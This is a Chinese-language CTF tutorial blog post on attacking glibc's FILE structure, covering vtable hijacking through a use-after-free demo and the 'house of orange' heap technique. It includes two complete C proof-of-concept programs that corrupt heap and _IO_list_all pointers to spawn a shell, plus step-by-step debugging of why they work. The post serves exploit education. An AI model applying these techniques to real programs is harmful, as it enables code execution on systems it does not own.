---
title: Pwn with File结构体（一）
authorId: hac425
tags:
  - file struct
categories:
  - ctf
date: 2017-12-07 16:33:00
---
### 前言


---
本文由 **本人** 首发于 先知安全技术社区：  https://xianzhi.aliyun.com/forum/user/5274/

---


利用 `FILE` 结构体进行攻击，在现在的 `ctf` 比赛中也经常出现，最近的 `hitcon2017` 又提出了一种新的方式。本文对该攻击进行总结。

### 正文
首先来一张 `_IO_FILE ` 结构体的结构

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512636924331hh06dby3.png?imageslim)

`_IO_FILE_plus` 等价于 `_IO_FILE` + `vtable` 

调试着来看看(64 位)

![paste image](http://oy9h5q2k4.bkt.clouddn.com/151263718616115jrxm3q.png?imageslim)

`vtable` 指向的位置是一组函数指针
![paste image](http://oy9h5q2k4.bkt.clouddn.com/15126373161775c8fyo38.png?imageslim)
**利用 `vtable` 进行攻击**

通过一个 `uaf` 的示例代码来演示

```
#include <stdio.h>
#include <stdlib.h>

void pwn(void)
{
    system("sh");
}

// 用于伪造 vtable
void * funcs[] = {
    NULL, // "extra word"
    NULL, // DUMMY
    exit, // finish
    NULL, // overflow
    NULL, // underflow
    NULL, // uflow
    NULL, // pbackfail
    NULL, // xsputn
    NULL, // xsgetn
    NULL, // seekoff
    NULL, // seekpos
    NULL, // setbuf
    NULL, // sync
    NULL, // doallocate
    NULL, // read
    NULL, // write
    NULL, // seek
    pwn,  // close
    NULL, // stat
    NULL, // showmanyc
    NULL, // imbue
};

int main(int argc, char * argv[])
{   
    FILE *fp;  // _IO_FILE 结构体
    unsigned char *str;

    printf("sizeof(FILE): 0x%x\n", sizeof(FILE));

    /* _IO_FILE + vtable_ptr 分配一个 _IO_FILE_plus 结构体 */
    str = malloc(sizeof(FILE) + sizeof(void *));
    printf("freeing %p\n", str);
    free(str);

    /*打开一个文件，会分配一个 _IO_FILE_plus 结构体 ， 会使用刚刚 free 掉的内存*/
    if (!(fp = fopen("/dev/null", "r"))) {
        perror("fopen");
        return 1;
    }
    printf("FILE got %p\n", fp);

    /* 取得地址  */
    printf("_IO_jump_t @ %p is 0x%08lx\n",
           str + sizeof(FILE), *(unsigned long*)(str + sizeof(FILE)));

    /* 修改 vtable 指针 */
    *(unsigned long*)(str + sizeof(FILE)) = (unsigned long)funcs;
    printf("_IO_jump_t @ %p now 0x%08lx\n",
           str + sizeof(FILE), *(unsigned long*)(str + sizeof(FILE)));

    /* 调用 fclose 触发 close */
    fclose(fp);

    return 0;
}

```

- 首先分配一个 `_IO_FILE_plus` 大小的内存块
- 然后释放掉调用 `fopen` 分配 `_IO_FILE_plus`  结构体
- 修改 `fp` 的 `vtable` 指针到我们布局的地址
- 调用 `fclose` 函数, 进而调用 `pwn`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512637077462pn33x6eg.png?imageslim)

调试可以看到，分配的大小为 `0xf0`(也就是 `0xe0+0x10`) 和`_IO_FILE_plus` 的大小是一样的

![paste image](http://oy9h5q2k4.bkt.clouddn.com/151263746988846mmixxo.png?imageslim)

`free` 掉后，调用 `fopen` 会占用这个内存
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512637720387deshksip.png?imageslim)

查看 `vtable` 也是符合预期
![paste image](http://oy9h5q2k4.bkt.clouddn.com/15126377713979pirrqdn.png?imageslim)

替换`vtable`指针之后
![paste image](http://oy9h5q2k4.bkt.clouddn.com/15126378684082t5esiwh.png?imageslim)

`close` 函数已经被修改为 `pwn` 函数，最后调用 `fclose` 函数，就会调用 `pwn` 函数


**house of orange**

为了便于调试，使用 [how2heap](https://raw.githubusercontent.com/shellphish/how2heap/master/house_of_orange.c) 的代码进行调试分析。


```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int winner ( char *ptr);

int main()
{


    char *p1, *p2;
    size_t io_list_all, *top;

    // 首先分配一个 0x400 的 chunk
    p1 = malloc(0x400-16);

    // 拿到 top chunk的地址
    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    // 修改 top chunk 的 size
    top[1] = 0xc01;

    // 触发 syscall 的 _int_free, top_chunk 放到了 unsort bin
    p2 = malloc(0x1000);

    // 根据 fd 指针的偏移计算 io_list_all 的地址
    io_list_all = top[2] + 0x9a8;

    // 修改 top_chunk 的 bk 为  io_list_all - 0x10 ， 后面会触发
    top[3] = io_list_all - 0x10;

    /*
     设置 fp 指针指向位置 开头 为 /bin/sh
    */

    memcpy( ( char *) top, "/bin/sh\x00", 8);

    // 修改 top chunk 的 大小 为 0x60
    top[1] = 0x61;

    /*
      为了可以正常调用 overflow() ，需要满足一些条件
      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    */

    _IO_FILE *fp = (_IO_FILE *) top;

    fp->_mode = 0; 
    fp->_IO_write_base = (char *) 2;
    fp->_IO_write_ptr = (char *) 3; 


    // 设置虚表
    size_t *jump_table = &top[12]; // controlled memory
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8

    // 再次 malloc, fastbin, smallbin都找不到需要的大小，会遍历 unsort bin 把它们添加到对应的 bins 中去
    // 之前已经把 top->bk 设置为 io_list_all - 0x10, 所以会把 io_list_all 的值 设置为 fd, 
    // 也就是 main_arena+88 
    // _IO_FILE_plus + 0x68 --> _china , main_arena+88 + 0x68 为 smallbin[5], 块大小为 0x60 
    // 所以要把 top的 size 设置为 0x60
    malloc(10);

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);
    return 0;
}


```



代码的流程如下:
- 首先分配 `0x400` 字节的块
- 修改 `top chunk` 的 `size` 域为 `0xc01`
- `malloc(0x1000)` 触发 `_int_free` , `top` 被放到了 `unsorted bin` , 下面称它为 `old_top`
- 布局 `old_top` , 设置 `bk = io_list_all - 0x10 ` ， 把`old_top`伪造成一个 `_IO_FILE_plus`,并设置好`vtable`
- `malloc(10)` 由于此时 `fastbin` , `smallbin` 均为空，所以会进入遍历 `unsorted bin` ，并根据相应的大小放到对应的 `bin` 中。上一步设置 `old_top` 大小为 `0x60` ， 所以在放置`old_top` 过程中，先通过  `unsorted bin attack` 修改 `io_list_all` 为 `fd也就是 main_arena->top` ， 然后 `old_top` 会被链到 `smallbin[5]` （大小为 0x60 ）, 接着继续遍历 `unsorted bin `，这一步 会 `abort`,原理下面说， 然后会遍历 `io_list_all` 调用 ` _IO_OVERFLOW (fp, EOF) `. 伪造 `vtable`  getshell。

**下面调试分析之**

参考断点：

```
break main
bp genops.c:775
bp  malloc.c:3472
```
调试到

```
23	     p2 = malloc(0x1000);

```
`top chunk` 的 `size` 已经被修改，`unsorted bin` 还是空的。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512649343374w57z9tul.png?imageslim)

单步步过，发现 `top` 已经被 添加到 `unsorted bin`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512649474593kp7jamb4.png?imageslim)
然后就是一系列的伪造 `_IO_FILE_plus` 操作， 直接运行到
```
 62	     malloc(10);

```
看看布局好后的结果

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512649649115pufiaajo.png?imageslim)

`vtable`
![paste image](http://oy9h5q2k4.bkt.clouddn.com/15126496905714c9muqxc.png?imageslim)
可以看到 `__overflow` 被设置为 `winner` 函数，所以只要调用 `__overflow` 就会调用 `winner` 。


下面看看，怎么通过堆布局实现 `getshell`

在 `malloc.c:3472` 下好断点，运行，会被断下来。

这里是遍历 ` unsorted bin` 的流程。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512650027099nn0durlb.png?imageslim)

会进入这里原因在于此时 `fastbin` , `smallbin` 均为空，不能满足分配的需求，接着就会进入这里。

这里会有一个 `check` ，过不去就会 `malloc_printerr` ，进而 `abort` 。 

第一次进入这里是可以过去的，然后会根据大小把 `victim` 放到合适的 `bin` 中，之前我们已经 把 `old_top` 的大小设置成了 `0x60`, 这里他就会被放到 `smallbin[5]` 里。

同时插入之前会先从`unsorted bin` 中 `unlink`  (unsorted bin attack) ,这时可以 往 `victim->bk + 0x10` 写入 `victim->fd`， 之前我们已经设置 `victim->bk 为 _IO_list_all-0x10`, 所以在这里就可以 修改 `_IO_list_all` 为 `main_arena->top`

第一次遍历 `unsorted bin`, 从 `unsorted bin` 移除时的相关变量,内存数据。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512651092965lxj5dz39.png?imageslim)

可以看到 `bck` 会成为`unsorted bin` 的起始位置，然后 
```
bck->fd = unsorted_chunks (av);
```

而且此时 `bck->fd ` 为 `_IO_list_all`。

继续运行，再次断在了 `malloc.c:3472`。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512651546282hwz6e5ug.png?imageslim)

可以看到，此时的 `_IO_list_all` 已经被修改成了 `<main_arena+88>`, `old_top` 被放到了 `smallbin[5]`， 而且此时 `victim->size` 为0， 所以下面会进入 `abort` 的流程。


我们来看看，此时构造的 `_IO_list_all` 的内容

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512652089939d3g3frdi.png?imageslim)

`_IO_list_all` 偏移 `0x68` 为 `_chain` ，这也是之前设置 `old_top` 大小为 `0x60` 的原因。
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512652147336uaktzxn6.png?imageslim)
这样就成功把 `old_top` 链入了 `_IO_list_all`。


下面看看该怎么拿 `shell`
在 `abort` 函数中会调用 `fflush(null)`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512652347680zoy5v0u2.png?imageslim)

实际调用的是 `_IO_flush_all_lockp`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512652528433f4lzgdak.png?imageslim)

遍历 `_IO_list_all` 调用 ` _IO_OVERFLOW (fp, EOF) `，其实就是调用 `fp->vtable->__overflow(fp,eof)`

第一次执行循环时，可以看上面的 `_IO_list_all` 数据，发现进入不了 `_IO_OVERFLOW` 这个判断，所以`_IO_list_all` 第一项的 `vtable` 中的数据是坏的也没有关系。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512653250943jy3lqm1y.png?imageslim)

第二次循环，通过 `fp = fp->_chain` 找到我们的 `old_top`, 我们已经在这布局好了数据。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1512653351122a7sdg8oj.png?imageslim)

运行 `getshell`

### 总结
`FILE` 结构体是一个很好的攻击目标，学习一下很有必要
调试时，尽可能用最小的代码复现问题。

参考链接：

http://www.evil0x.com/posts/13764.html

https://securimag.org/wp/news/buffer-overflow-exploitation/

https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

http://repo.thehackademy.net/depot_ouah/fsp-overflows.txt

http://blog.angelboy.tw/